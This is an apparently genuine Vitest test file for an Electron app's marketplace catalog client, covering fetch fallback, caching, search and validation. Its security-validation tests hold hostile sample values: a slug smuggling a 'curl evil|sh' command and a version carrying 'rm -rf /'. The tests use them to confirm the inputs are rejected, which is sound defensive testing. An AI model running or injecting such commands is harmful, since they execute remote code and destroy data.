// electron/tests/marketplace/client.test.ts
//
// fetchCatalog：mock fetch 验证（远程成功 / 远程失败→本地回退）。
// searchItems / groupByCategory：纯函数验证。
// 设置 AP_USER_DATA_DIR 到临时目录，避免 logger 写入真实用户目录。

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  fetchCatalog,
  searchItems,
  groupByCategory,
  __resetCatalogCacheForTest,
  __rewindCatalogCacheForTest,
  __rewindFailureBackoffForTest,
  CATALOG_CACHE_TTL_MS,
  CATALOG_FAILURE_BACKOFF_MS,
} from '../../src/main/marketplace/client';
import type { Catalog } from '../../src/main/marketplace/types';

const tmpRoot = path.join(os.tmpdir(), `ap-mp-client-test-${Date.now()}`);
const fakeCatalog: Catalog = {
  version: '9.9',
  updatedAt: '2026-01-01T00:00:00Z',
  items: [
    {
      id: 'agent-x',
      type: 'agent',
      slug: 'x-agent',
      name: 'X Agent',
      version: '1.0.0',
      author: 'tester',
      description: 'a testing agent',
      readme: '# X',
      tags: ['test', 'demo'],
      category: 'dev',
      iconEmoji: '🧪',
      verificationStatus: 'community',
      downloadUrl: '',
      checksum: '',
      sizeBytes: 1,
      installCount: 0,
    },
  ],
};

let fetchSpy: ReturnType<typeof vi.spyOn>;

beforeEach(() => {
  fs.mkdirSync(tmpRoot, { recursive: true });
  process.env.AP_USER_DATA_DIR = tmpRoot;
  fetchSpy = vi.spyOn(globalThis, 'fetch') as unknown as typeof fetchSpy;
  // I6：fetchCatalog 现有进程内 TTL 缓存——逐用例清零，隔离缓存副作用
  __resetCatalogCacheForTest();
});

afterEach(() => {
  fetchSpy.mockRestore();
  vi.restoreAllMocks();
  __resetCatalogCacheForTest();
  fs.rmSync(tmpRoot, { recursive: true, force: true });
  delete process.env.AP_USER_DATA_DIR;
});

describe('marketplace/client fetchCatalog', () => {
  it('远程成功时返回远程 catalog', async () => {
    fetchSpy.mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => fakeCatalog,
    } as Response);

    const catalog = await fetchCatalog('https://example.test/catalog.json');
    expect(fetchSpy).toHaveBeenCalledOnce();
    expect(catalog.version).toBe('9.9');
    expect(catalog.items).toHaveLength(1);
    expect(catalog.items[0]!.id).toBe('agent-x');
  });

  it('远程非 2xx 时回退本地 catalog', async () => {
    fetchSpy.mockResolvedValue({ ok: false, status: 500 } as Response);

    const catalog = await fetchCatalog('https://example.test/catalog.json');
    // 本地内置 catalog 含 5 个预填充 item（见 resources/marketplace/catalog.json）
    expect(catalog.items.length).toBeGreaterThanOrEqual(1);
    expect(catalog.version).toBe('1.0');
  });

  it('远程抛错时回退本地 catalog', async () => {
    fetchSpy.mockRejectedValue(new Error('network down'));

    const catalog = await fetchCatalog('https://example.test/catalog.json');
    expect(catalog.items.length).toBe(6);
    expect(catalog.version).toBe('1.0');
  });
});

// === I6 契约锁（终审修复）：fetchCatalog 进程内缓存 ===
// 成功结果缓存 5 分钟；失败（远程非 2xx / 抛错 / 校验拒）进 60s 退避负缓存。
// 方案 A（2026-09-22）：退避窗口内二次调用零网络请求、直接本地回退——修复
// 「Agent/MCP/Skill 面板切换每次都吃满网络超时」（离线环境成功缓存从未建立，
// 每次列表都同步重试远程）。窗口过期后重试远程，网络恢复即可拿到新目录。

describe('marketplace/client fetchCatalog TTL 缓存（I6）', () => {
  function okRemote(): void {
    fetchSpy.mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => fakeCatalog,
    } as Response);
  }

  it('TTL 内二次调用不发网络请求（命中缓存，同对象）', async () => {
    okRemote();
    const first = await fetchCatalog('https://example.test/catalog.json');
    const second = await fetchCatalog('https://example.test/catalog.json');
    expect(fetchSpy).toHaveBeenCalledOnce();
    expect(second.version).toBe(first.version);
    expect(second).toBe(first); // 缓存命中返回同一引用（零拷贝）
  });

  it('缓存过期后重取（回拨 TTL+1 → 再次发网络请求）', async () => {
    okRemote();
    await fetchCatalog('https://example.test/catalog.json');
    __rewindCatalogCacheForTest(CATALOG_CACHE_TTL_MS + 1);
    await fetchCatalog('https://example.test/catalog.json');
    expect(fetchSpy).toHaveBeenCalledTimes(2);
  });

  it('失败进退避：远程抛错 → 窗口内二次调用零网络请求（直接本地）', async () => {
    fetchSpy.mockRejectedValue(new Error('fetch failed'));
    await fetchCatalog('https://example.test/catalog.json'); // 失败 → 本地回退 + 进退避
    const second = await fetchCatalog('https://example.test/catalog.json');
    expect(fetchSpy).toHaveBeenCalledOnce();
    expect(second.version).toBe('1.0');
  });

  it('失败进退避：远程非 2xx → 同样进入退避窗口', async () => {
    fetchSpy.mockResolvedValue({ ok: false, status: 503 } as Response);
    await fetchCatalog('https://example.test/catalog.json');
    await fetchCatalog('https://example.test/catalog.json');
    expect(fetchSpy).toHaveBeenCalledOnce();
  });

  it('失败进退避：校验拒（200 但 catalog 非法）→ 同样进入退避窗口', async () => {
    fetchSpy.mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({ version: '9.9', updatedAt: 'x', items: 'nope' }),
    } as Response);
    await fetchCatalog('https://example.test/catalog.json');
    await fetchCatalog('https://example.test/catalog.json');
    expect(fetchSpy).toHaveBeenCalledOnce();
  });

  it('退避窗口过期后重试远程（网络恢复 → 拿到远程目录）', async () => {
    fetchSpy.mockRejectedValueOnce(new Error('offline'));
    await fetchCatalog('https://example.test/catalog.json'); // 失败进退避
    __rewindFailureBackoffForTest(CATALOG_FAILURE_BACKOFF_MS + 1);
    fetchSpy.mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => fakeCatalog,
    } as Response);
    const catalog = await fetchCatalog('https://example.test/catalog.json');
    expect(fetchSpy).toHaveBeenCalledTimes(2);
    expect(catalog.version).toBe('9.9');
  });

  it('不同 catalogUrl 的缓存互不干扰（按 URL 键控）', async () => {
    okRemote();
    await fetchCatalog('https://a.test/catalog.json');
    await fetchCatalog('https://b.test/catalog.json');
    expect(fetchSpy).toHaveBeenCalledTimes(2);
  });
});

describe('marketplace/client searchItems', () => {
  const catalog: Catalog = {
    version: '1.0',
    updatedAt: '2026-01-01',
    items: [
      {
        id: '1',
        type: 'agent',
        slug: 'coder',
        name: '程序员',
        version: '1.0.0',
        author: 'a',
        description: '写代码',
        readme: '',
        tags: ['coding', 'dev'],
        category: 'dev',
        iconEmoji: '💻',
        verificationStatus: 'official',
        downloadUrl: '',
        checksum: '',
        sizeBytes: 0,
        installCount: 0,
      },
      {
        id: '2',
        type: 'mcp',
        slug: 'fs',
        name: 'Filesystem',
        version: '1.0.0',
        author: 'b',
        description: '文件系统',
        readme: '',
        tags: ['filesystem'],
        category: 'dev',
        iconEmoji: '📁',
        verificationStatus: 'verified',
        downloadUrl: '',
        checksum: '',
        sizeBytes: 0,
        installCount: 0,
      },
    ],
  };

  it('空 query 返回全部（可叠加类型过滤）', () => {
    expect(searchItems(catalog, '')).toHaveLength(2);
    expect(searchItems(catalog, '', 'mcp')).toHaveLength(1);
    expect(searchItems(catalog, '', 'mcp')[0]!.id).toBe('2');
  });

  it('按 name 匹配（大小写无关）', () => {
    const res = searchItems(catalog, 'FILE');
    expect(res).toHaveLength(1);
    expect(res[0]!.slug).toBe('fs');
  });

  it('按 description 匹配', () => {
    const res = searchItems(catalog, '代码');
    expect(res).toHaveLength(1);
    expect(res[0]!.slug).toBe('coder');
  });

  it('按 tag 匹配', () => {
    const res = searchItems(catalog, 'coding');
    expect(res).toHaveLength(1);
    expect(res[0]!.slug).toBe('coder');
  });

  it('按 slug 匹配', () => {
    const res = searchItems(catalog, 'coder');
    expect(res).toHaveLength(1);
  });

  it('组合 query + type 过滤', () => {
    expect(searchItems(catalog, 'filesystem', 'agent')).toHaveLength(0);
    expect(searchItems(catalog, 'filesystem', 'mcp')).toHaveLength(1);
  });
});

describe('marketplace/client groupByCategory', () => {
  it('按 category 正确分组', () => {
    const catalog: Catalog = {
      version: '1.0',
      updatedAt: '2026-01-01',
      items: [
        {
          id: '1',
          type: 'agent',
          slug: 'a1',
          name: 'A1',
          version: '1.0.0',
          author: '',
          description: '',
          readme: '',
          tags: [],
          category: 'dev',
          iconEmoji: '🤖',
          verificationStatus: 'official',
          downloadUrl: '',
          checksum: '',
          sizeBytes: 0,
          installCount: 0,
        },
        {
          id: '2',
          type: 'agent',
          slug: 'a2',
          name: 'A2',
          version: '1.0.0',
          author: '',
          description: '',
          readme: '',
          tags: [],
          category: 'writing',
          iconEmoji: '🤖',
          verificationStatus: 'official',
          downloadUrl: '',
          checksum: '',
          sizeBytes: 0,
          installCount: 0,
        },
        {
          id: '3',
          type: 'agent',
          slug: 'a3',
          name: 'A3',
          version: '1.0.0',
          author: '',
          description: '',
          readme: '',
          tags: [],
          category: 'dev',
          iconEmoji: '🤖',
          verificationStatus: 'official',
          downloadUrl: '',
          checksum: '',
          sizeBytes: 0,
          installCount: 0,
        },
      ],
    };

    const groups = groupByCategory(catalog.items);
    expect(groups.size).toBe(2);
    expect(groups.get('dev')).toHaveLength(2);
    expect(groups.get('writing')).toHaveLength(1);
  });

  it('空数组返回空 Map', () => {
    expect(groupByCategory([]).size).toBe(0);
  });
});

describe('marketplace/client fetchCatalog 安全校验（S1）', () => {
  /** 构造单个 item 的最小 catalog，字段可覆盖（默认全部合法） */
  function makeCatalog(itemOverrides: Record<string, unknown>): Catalog {
    return {
      version: '9.9',
      updatedAt: '2026-01-01T00:00:00Z',
      items: [
        {
          id: 'x-1',
          type: 'agent',
          slug: 'x-agent',
          name: 'X Agent',
          version: '1.0.0',
          author: 'tester',
          description: 'a testing agent',
          readme: '# X',
          tags: ['test'],
          category: 'dev',
          iconEmoji: '🧪',
          verificationStatus: 'community',
          downloadUrl: '',
          checksum: '',
          sizeBytes: 1,
          installCount: 0,
          ...itemOverrides,
        },
      ],
    };
  }

  /** 期望远程 catalog 被判为不可信 → 回退本地内置（6 items / version 1.0——v2.1 加办公助理） */
  async function expectLocalFallback(catalog: unknown): Promise<void> {
    fetchSpy.mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => catalog,
    } as Response);
    const result = await fetchCatalog('https://example.test/catalog.json');
    expect(result.version).toBe('1.0');
    expect(result.items).toHaveLength(6);
  }

  it('item.slug 含 shell 元字符 → 远程 catalog 整体拒绝，回退本地', async () => {
    await expectLocalFallback(makeCatalog({ slug: 'x"$(curl evil|sh)"' }));
  });

  it('item.version 含 shell 元字符 → 回退本地', async () => {
    await expectLocalFallback(makeCatalog({ version: '1.0; rm -rf /' }));
  });

  it('item.type 非法枚举 → 回退本地', async () => {
    await expectLocalFallback(makeCatalog({ type: 'evil' }));
  });

  it('downloadUrl 非 https → 回退本地', async () => {
    await expectLocalFallback(
      makeCatalog({ downloadUrl: 'http://evil.test/pkg.tar.gz' }),
    );
  });

  it('checksum 非 sha256 hex → 回退本地', async () => {
    await expectLocalFallback(
      makeCatalog({ downloadUrl: 'https://ok.test/pkg.tar.gz', checksum: 'not-hex!' }),
    );
  });

  it('items 非数组 → 回退本地', async () => {
    await expectLocalFallback({ version: '9.9', updatedAt: 'x', items: 'nope' });
  });

  it('合法远程 catalog（https downloadUrl + sha256 checksum）→ 正常返回远程内容', async () => {
    fetchSpy.mockResolvedValue({
      ok: true,
      status: 200,
      json: async () =>
        makeCatalog({
          downloadUrl: 'https://ok.test/pkg.tar.gz',
          checksum: 'a'.repeat(64),
        }),
    } as Response);
    const catalog = await fetchCatalog('https://example.test/catalog.json');
    expect(catalog.version).toBe('9.9');
    expect(catalog.items).toHaveLength(1);
    expect(catalog.items[0]!.slug).toBe('x-agent');
  });
});
